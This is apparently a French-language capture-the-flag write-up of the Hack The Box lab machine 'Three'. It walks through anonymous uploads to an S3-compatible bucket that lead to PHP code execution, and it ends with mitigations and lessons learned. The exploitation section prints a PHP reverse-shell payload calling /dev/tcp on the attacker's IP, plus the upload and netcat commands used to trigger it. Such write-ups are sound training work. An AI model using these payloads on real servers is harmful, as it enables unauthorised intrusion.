## 1. Reconnaissance

### 1.1. Énumération des ports

J'ai commencé par effectuer un scan Nmap pour identifier les ports ouverts et les services exposés par la machine.

```bash
nmap -Pn --disable-arp-ping --min-rate 5000 -sV 10.129.227.248
```

**Explication des paramètres :**

- `-Pn` : considère l'hôte comme actif sans effectuer la découverte initiale.
    
- `--disable-arp-ping` : désactive la découverte ARP de Nmap.
    
- `--min-rate 5000` : demande un débit minimal de 5 000 paquets par seconde pendant les phases concernées.
    
- `-sV` : tente d'identifier les services et leurs versions.
    

**Résultats :**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

Le scan révèle deux services accessibles :

- **SSH (22)** : service d'accès distant sécurisé.
    
- **HTTP (80)** : serveur Web Apache.
    

La présence d'Apache m'a orienté vers l'énumération de l'application Web.

### 1.2. Analyse du site Web

J'ai accédé au site depuis mon navigateur :

```text
http://10.129.227.248/
```

En explorant la page, j'ai identifié le nom de domaine associé au site :

```text
thetoppers.htb
```

Pour pouvoir utiliser ce nom localement, j'ai ajouté une entrée dans `/etc/hosts` :

```text
10.129.227.248    thetoppers.htb
```

**Pourquoi ?**

Le fichier `/etc/hosts` permet d'associer localement un nom d'hôte à une adresse IP sans dépendre d'un serveur DNS.

Cela me permet désormais de visiter :


## 2. Énumération des sous-domaines et Virtual Hosts

### 2.1. Première tentative avec FFUF

Après avoir découvert le domaine, j'ai tenté d'identifier d'éventuels sous-domaines avec FFUF.

```bash
ffuf -u http://FUZZ.thetoppers.htb/ \
-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Fonctionnement :**

FFUF remplace `FUZZ` par chacun des mots présents dans la wordlist.

Par exemple :

```text
admin.thetoppers.htb
dev.thetoppers.htb
api.thetoppers.htb
```

Cependant, le scan s'est terminé avec :

```text
Progress: [4989/4989]
Errors: 4989
```

**Interprétation :**

Toutes les requêtes ont rencontré une erreur. La cause probable est l'impossibilité de résoudre les sous-domaines testés.

En effet, avoir ajouté `thetoppers.htb` dans `/etc/hosts` ne permet pas automatiquement de résoudre `admin.thetoppers.htb` ou les autres sous-domaines.



![Pasted image 20261027141921.png](/portofolio/images/writeups/obsidian/three-df84494374/pasted-image-20261027141921-67d7d28276.png)


### 2.2. Énumération des Virtual Hosts

J'ai ensuite essayé une approche différente : modifier directement l'en-tête HTTP `Host`.

```bash
ffuf -u http://thetoppers.htb/ \
-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-H "Host: FUZZ.thetoppers.htb"
```

Contrairement à la première méthode, cette technique ne nécessite pas de résoudre individuellement chaque sous-domaine testé.

FFUF contacte le serveur déjà résolu et modifie la valeur du champ HTTP `Host`.

Plusieurs noms ont retourné :

```text
Status: 200
Size: 11952
Words: 1832
Lines: 235
```

**Interprétation :**

Les réponses observées possédaient les mêmes caractéristiques.

Cela suggère qu'Apache retournait une page par défaut pour plusieurs noms non reconnus.

Un code HTTP `200 OK` ne suffit donc pas à confirmer l'existence d'un Virtual Host distinct.

## 3. Énumération du service S3

### 3.1. Comprendre S3

**Amazon S3 (Simple Storage Service)** est un service de stockage d'objets.

Les données sont organisées principalement autour de deux concepts :

- **Bucket** : conteneur logique permettant de stocker des objets.
    
- **Object** : fichier ou donnée stockée dans un bucket, identifiable par une clé.
    

Le service découvert sur `s3.thetoppers.htb` expose une interface compatible avec S3.

Pour interagir avec celui-ci, j'ai utilisé **AWS CLI**.

### 3.2. Installation d'AWS CLI

```bash
sudo apt install awscli
```

AWS CLI est un utilitaire permettant d'interagir avec des services AWS ou avec certains services compatibles avec leurs API.


![Pasted image 20261027163013.png](/portofolio/images/writeups/obsidian/three-df84494374/pasted-image-20261027163013-d6d55ef2cd.png)

### 3.3. Identification des buckets

J'ai utilisé la commande suivante :

```bash
aws --endpoint-url http://s3.thetoppers.htb \
s3 ls --no-sign-request
```

**Explication :**

- `--endpoint-url` : définit le serveur S3 à interroger.
    
- `s3` : sélectionne les commandes de gestion S3.
    
- `ls` : liste les buckets accessibles.
    
- `--no-sign-request` : effectue une requête sans signature d'authentification AWS.
    

**Résultat :**

```text
2026-10-27 13:14:54 thetoppers.htb
```

J'ai donc identifié un bucket nommé :

```text
thetoppers.htb
```

Le serveur autorise cette opération de découverte sans authentification AWS.

Cela m'a conduit à examiner la possibilité de téléverser un fichier dans le bucket.

## 4. Vérification de l'exécution PHP

### 4.1. Création d'un fichier de test

Avant de chercher à obtenir un accès au système, j'ai voulu vérifier si un fichier PHP téléversé pouvait être exécuté par le serveur Web.

J'ai créé `test.php` :

```bash
echo '<?php echo "PHP_EXECUTION_OK"; ?>' > test.php
```

Ce script PHP affiche une chaîne de caractères uniquement lorsque son code est interprété.

### 4.2. Téléversement vers le bucket

```bash
aws --endpoint-url http://s3.thetoppers.htb \
s3 cp test.php s3://thetoppers.htb/ \
--no-sign-request
```

**Explication :**

- `s3 cp` : copie un fichier vers ou depuis un bucket.
    
- `test.php` : fichier local.
    
- `s3://thetoppers.htb/` : destination dans le bucket.
    
- `--no-sign-request` : demande un téléversement sans signature AWS.
    

**Résultat :**

```text
upload: ./test.php to s3://thetoppers.htb/test.php
```

Le téléversement a réussi sans identifiants AWS.

### 4.3. Validation de l'exécution

Pour déterminer si le fichier était accessible et exécuté par Apache, j'ai utilisé :

```bash
curl http://thetoppers.htb/test.php
```

Résultat :

```text
PHP_EXECUTION_OK
```

**Interprétation :**

Le serveur exécute le fichier PHP téléversé.

Cette observation confirme une chaîne d'exécution de code :

```text
Bucket S3 accessible en écriture
           ↓
Téléversement d'un fichier PHP
           ↓
Fichier accessible depuis le serveur Web
           ↓
Interprétation du PHP
           ↓
Exécution de code côté serveur
```

Il s'agit du point déterminant de l'exploitation : un fichier envoyé dans le stockage peut être exécuté par le serveur Web.

## 5. Obtention d'un Reverse Shell

### 5.1. Identification de mon adresse VPN

Pour recevoir une connexion depuis la machine cible, j'ai identifié l'adresse IP de mon interface VPN HTB.

```bash
ip a
```

Résultat pertinent :

```text
tun0
inet 10.10.17.108/23
```

L'adresse `10.10.17.108` est celle utilisée pour recevoir la connexion provenant de la cible.

![Pasted image 20261027165234.png](/portofolio/images/writeups/obsidian/three-df84494374/pasted-image-20261027165234-c2c8c2d8a1.png)


### 5.2. Création du payload PHP

J'ai créé un fichier nommé `shell.php` :

```bash
nano shell.php
```

Contenu :

```php
<?php
$ip = "10.10.17.108";
$port = 4444;

system("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
```

**Fonctionnement :**

Le script utilise `system()` pour demander l'exécution d'une commande système.

La commande Bash ouvre une connexion TCP vers ma machine Kali sur le port `4444`.

Les flux d'entrée et de sortie du shell sont redirigés vers cette connexion.

**Principe du Reverse Shell :**

Contrairement à une connexion SSH classique, ce n'est pas l'attaquant qui établit directement une session shell vers la cible.

C'est la cible qui initie une connexion sortante vers la machine de l'attaquant.

### 5.3. Téléversement du payload

J'ai envoyé le nouveau fichier dans le même bucket :

```bash
aws --endpoint-url http://s3.thetoppers.htb \
s3 cp shell.php s3://thetoppers.htb/ \
--no-sign-request
```

Résultat :

```text
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

Le fichier est maintenant présent dans le stockage accessible depuis le serveur Web.


![Pasted image 20261027164148.png](/portofolio/images/writeups/obsidian/three-df84494374/pasted-image-20261027164148-84fc906889.png)

### 5.4. Préparation du listener

Sur ma machine Kali, j'ai démarré Netcat :

```bash
nc -lvnp 4444
```

**Explication :**

- `-l` : mode écoute.
    
- `-v` : affichage détaillé.
    
- `-n` : désactive la résolution des noms.
    
- `-p 4444` : définit le port local d'écoute.
    

Netcat attend alors une connexion entrante sur le port 4444.

![Pasted image 20261027164406.png](/portofolio/images/writeups/obsidian/three-df84494374/pasted-image-20261027164406-4776f12fcc.png)


### 5.5. Déclenchement du Reverse Shell

Une fois le listener lancé, j'ai accédé au fichier PHP téléversé :

```bash
curl http://thetoppers.htb/shell.php
```

Cette requête demande au serveur Web de traiter le fichier PHP.

L'exécution du script provoque alors l'établissement d'une connexion vers mon listener.



![Pasted image 20261027164438.png](/portofolio/images/writeups/obsidian/three-df84494374/pasted-image-20261027164438-861a1fbb1f.png)

**Résultat observé dans Netcat :**

```text
listening on [any] 4444 ...
connect to [10.10.17.108] from (UNKNOWN) [10.129.227.248]
```

J'ai obtenu une session shell sous le compte :

```text
www-data@three:/var/www/html$
```

Le compte `www-data` est couramment utilisé par les processus Web sous Debian et Ubuntu.

Les messages concernant l'absence de contrôle des jobs indiquent que la session obtenue ne possède pas un terminal interactif complet. Ils n'empêchent pas l'exécution des commandes observées.

## 7. Analyse de la vulnérabilité

### 7.1. Cause de la compromission

La compromission repose sur l'enchaînement de deux faiblesses :

1. Le service S3-compatible autorise le téléversement de fichiers dans le bucket `thetoppers.htb` sans authentification AWS.
    
2. Les fichiers PHP déposés sont accessibles et exécutés par le serveur Web.
    

La première faiblesse permet de déposer un fichier contrôlé par l'attaquant.

La seconde transforme ce téléversement en possibilité d'exécution de code côté serveur.

**Chaîne d'attaque :**

```text
Reconnaissance réseau
       ↓
Découverte du domaine
       ↓
Identification de s3.thetoppers.htb
       ↓
Énumération du service S3
       ↓
Bucket thetoppers.htb
       ↓
Téléversement PHP sans authentification
       ↓
Validation de l'exécution PHP
       ↓
Reverse Shell
       ↓
Session www-data
       ↓
Récupération du flag
```

### 7.2. Mesures de sécurité

Pour éviter cette classe de vulnérabilités, plusieurs mesures sont essentielles :

- Restreindre les permissions d'écriture sur les buckets S3.
    
- Interdire les téléversements anonymes lorsqu'ils ne sont pas nécessaires.
    
- Séparer les espaces de stockage de fichiers des répertoires exécutables du serveur Web.
    
- Désactiver l'exécution de scripts dans les répertoires destinés aux téléversements.
    
- Appliquer le principe du moindre privilège aux services Web.
    

## 8. Lessons Learned

Cette machine m'a permis de travailler plusieurs compétences essentielles en pentest :

- **Reconnaissance :** identifier les services exposés et choisir une surface d'attaque.
    
- **DNS et Virtual Hosts :** distinguer résolution de noms et routage HTTP basé sur `Host`.
    
- **Énumération :** comprendre pourquoi une réponse `200 OK` ne valide pas automatiquement un VHost.
    
- **AWS CLI :** interagir avec un service de stockage S3-compatible.
    
- **File Upload :** vérifier si un fichier téléversé est accessible puis exécutable.
    
- **RCE :** comprendre comment l'exécution de PHP peut conduire à l'exécution de commandes système.
    
- **Reverse Shell :** comprendre la connexion sortante initiée par la cible.
    
- **Post-exploitation :** explorer le système après l'accès initial.
    

### Erreur importante rencontrée

Lors de l'énumération, j'ai initialement interprété l'absence de résultats FFUF comme un échec de la découverte.

Cette expérience m'a appris qu'il faut distinguer :

- Une requête qui échoue à cause d'un problème de résolution ou de connectivité.
    
- Une requête qui reçoit une réponse HTTP valide, mais non pertinente.
    
- Une réponse masquée par les filtres d'un outil.
    

Elle m'a également montré l'importance de prendre en compte les indices déjà disponibles avant de multiplier les tentatives de brute-force.

## 9. Conclusion

La machine Three illustre comment une mauvaise configuration de stockage S3, combinée à l'exécution de scripts PHP téléversés, peut permettre une compromission du serveur Web.

Le point essentiel de cette exploitation n'était pas simplement de téléverser un fichier, mais de démontrer que ce fichier pouvait être exécuté côté serveur.

**La principale leçon de ce lab est de valider méthodiquement chaque hypothèse avant de passer à la phase suivante.**
